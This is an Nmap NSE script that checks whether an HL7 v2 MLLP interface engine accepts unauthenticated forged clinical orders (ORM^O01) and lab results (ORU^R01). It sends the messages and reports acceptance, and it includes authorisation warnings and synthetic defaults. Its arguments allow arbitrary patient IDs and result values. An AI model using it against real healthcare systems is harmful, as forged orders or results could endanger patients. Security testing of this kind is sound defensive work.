local shortport = require "shortport"
local stdnse = require "stdnse"
local nmap = require "nmap"
local hl7 = require "hl7"

description = [[
Tests whether an HL7 v2 interface engine accepts unauthenticated order
(ORM^O01) and result (ORU^R01) messages - i.e. whether an attacker who can
reach the MLLP port can inject forged clinical orders or laboratory results.

MLLP has no application-layer authentication, so an engine that acknowledges an
inbound ORM/ORU from any client will typically route or persist it downstream.
Injecting a fake order can trigger unnecessary procedures or medication;
injecting a fake result (e.g. a critical lab value) can drive clinical
decisions on fabricated data. This script sends clearly-synthetic ORM and ORU
messages (processing ID T, an obviously fake patient) and reports whether the
engine accepted them (MSA|AA), rejected them (MSA|AE/AR), or failed to respond.

This is a HIGHLY INTRUSIVE test: on a real system it writes order/result
messages into the interface. Only run it against systems you are explicitly
authorised to test, in a lab or a controlled maintenance window. It defaults to
processing ID "T" (test) and a synthetic patient to reduce the chance of a
message being treated as production data, but acceptance still proves the
injection path is open.
]]

---
-- @usage
-- nmap -p2575 --script hl7-inject <target>
-- @usage
-- nmap -p2575 --script hl7-inject --script-args
--   hl7-inject.mode=result,hl7-inject.patient_id=PAT001,hl7-inject.value=600 <target>
--
-- @output
-- PORT     STATE SERVICE
-- 2575/tcp open  hl7
-- | hl7-inject:
-- |   Order  (ORM^O01): ACCEPTED - MSA|AA
-- |   Result (ORU^R01): ACCEPTED - MSA|AA
-- |   VULNERABILITY: Engine accepted unauthenticated order/result injection
-- |_    An attacker with TCP access can inject forged orders and lab results
--
-- @args hl7-inject.mode         "order", "result" or "both". Default: both
-- @args hl7-inject.patient_id   Patient identifier (PID-3). Default: synthetic
-- @args hl7-inject.patient_name Patient name (PID-5). Default: ZZZTEST^NMAP
-- @args hl7-inject.service      Order/observation service (OBR-4). Default:
--                               a generic test panel
-- @args hl7-inject.value        Result value for ORU (OBX-5). Default: 9999
-- @args hl7-inject.order_control ORC-1 for ORM. Default: NW (new order)
-- @args hl7-inject.sending_app  Sending Application (MSH-3). Default: NMAP
-- @args hl7-inject.timeout      Response timeout in seconds. Default: 8
-- @args hl7-inject.tls          "true" for MLLP over TLS. Default: false
---

author = "Paulino Calderon <paulino@calderonpale.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

portrule = shortport.port_or_service({2575, 2576}, "hl7", "tcp", "open")

local function arg(name, default)
  return stdnse.get_script_args("hl7-inject." .. name) or default
end

--- Send one message and classify acceptance.
-- @return class ("ACCEPTED"/"REJECTED"/"NO-RESPONSE"), detail (string)
local function inject(host, port, msg, timeout_s, tls)
  local ok, resp = hl7.transact(host, port, msg, timeout_s, tls)
  if not ok then
    return "NO-RESPONSE", tostring(resp)
  end
  local info = hl7.parse_response(resp)
  local code = info.ack_code
  if code == "AA" or code == "CA" then
    return "ACCEPTED", "MSA|" .. code
  elseif code == "AE" or code == "CE" or code == "AR" or code == "CR" then
    return "REJECTED", "MSA|" .. code
  end
  if hl7.find_segment(info.segments, "MSH") then
    return "REJECTED", "reply without a positive MSA"
  end
  return "NO-RESPONSE", "unparseable reply"
end

action = function(host, port)
  local out = stdnse.output_table()
  local mode = arg("mode", "both"):lower()
  local timeout_s = tonumber(arg("timeout", "8"))
  local tls = arg("tls", "false") == "true"
  local common = {
    patient_id = arg("patient_id", "ZZZTEST"),
    patient_name = arg("patient_name", "ZZZTEST^NMAP"),
    service = arg("service", nil),
    sending_app = arg("sending_app", "NMAP"),
    processing_id = "T",
  }

  local any_accepted = false

  if mode == "order" or mode == "both" then
    local m = hl7.build_orm_o01({
      patient_id = common.patient_id, patient_name = common.patient_name,
      service = common.service, sending_app = common.sending_app,
      order_control = arg("order_control", "NW"),
      processing_id = common.processing_id,
    })
    local class, detail = inject(host, port, m, timeout_s, tls)
    out["Order  (ORM^O01)"] = class .. " - " .. detail
    if class == "ACCEPTED" then any_accepted = true end
  end

  if mode == "result" or mode == "both" then
    local m = hl7.build_oru_r01({
      patient_id = common.patient_id, patient_name = common.patient_name,
      service = common.service, sending_app = common.sending_app,
      value = arg("value", "9999"),
      processing_id = common.processing_id,
    })
    local class, detail = inject(host, port, m, timeout_s, tls)
    out["Result (ORU^R01)"] = class .. " - " .. detail
    if class == "ACCEPTED" then any_accepted = true end
  end

  if any_accepted then
    out["VULNERABILITY"] =
      "Engine accepted unauthenticated order/result injection"
    out["Impact"] =
      "An attacker with TCP access can inject forged orders and lab results"
    nmap.set_port_version(host, port, "hardmatched")
  else
    out["Note"] = "No injection accepted (engine rejected or did not respond)"
  end
  return out
end
